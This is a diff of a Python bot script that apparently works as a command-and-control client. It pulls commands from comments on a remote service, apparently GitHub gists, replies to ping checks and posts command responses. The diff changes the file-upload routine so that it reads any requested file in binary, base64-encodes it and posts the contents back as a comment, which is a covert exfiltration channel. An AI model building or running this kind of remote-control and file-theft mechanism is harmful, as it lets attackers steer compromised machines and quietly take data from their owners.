@@ -1,11 +1,12 @@
 #! /bin/python3
 import argparse
+import base64
 import subprocess
 import requests
 from dotenv import dotenv_values
 import time
 
-from utils import create_markdown_comment,  create_markdown_timestamp, get_random_message, parse_markdown_comment
+from utils import create_command_response, create_markdown_timestamp, get_random_message, parse_command, parse_markdown_comment
 
 parser = argparse.ArgumentParser(
     prog='bot.py',
@@ -66,15 +67,15 @@ def get_latest_comments():
 
 
 def get_commands(comments):
-    commands = map(lambda comment: parse_markdown_comment(
+    commands = map(lambda comment: parse_command(
         comment['body']), comments)
-    return filter(lambda command: command != '', commands)
+    return filter(lambda command: command != None, commands)
 
 
 def post_command(command: str):
     def get_message():
         state['command_text'] = state['command_text'] if state['command_text'] is not None else get_random_message()
-        return f"{state['command_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment(command)}"
+        return f"{state['command_text']}\n\n{create_markdown_timestamp()}\n\n{create_command_response(command)}"
 
     command_comment = state['command_comment']
     log(f'Sending response "{command}"')
@@ -103,7 +104,7 @@ def pong():
 
     def get_message():
         state['pong_text'] = state['pong_text'] if state['pong_text'] is not None else get_random_message()
-        return f"{state['pong_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment('pong')}"
+        return f"{state['pong_text']}\n\n{create_markdown_timestamp()}\n\n{create_command_response('pong')}"
 
     pong_comment = state['pong_comment']
     log(f'Sending "pong"')
@@ -143,11 +144,9 @@ def delete_comments():
 
 def post_file(filename):
     try:
-        file_contents = open(filename, "r").read()
-        gist_response = requests.post(gists_url, json={"files": {filename: {
-                                      "content": file_contents}}, 'description': ''}, headers=headers)
-        file_url = gist_response.json()["files"][filename]["raw_url"]
-        return post_command(f'{filename}:\n{file_url}')
+        file_contents = base64.b64encode(
+            open(filename, "rb").read()).decode('utf-8')
+        return post_command(f'{filename}:\n{file_contents}\n')
     except UnicodeDecodeError:
         log('Could not read file')
     except FileNotFoundError:
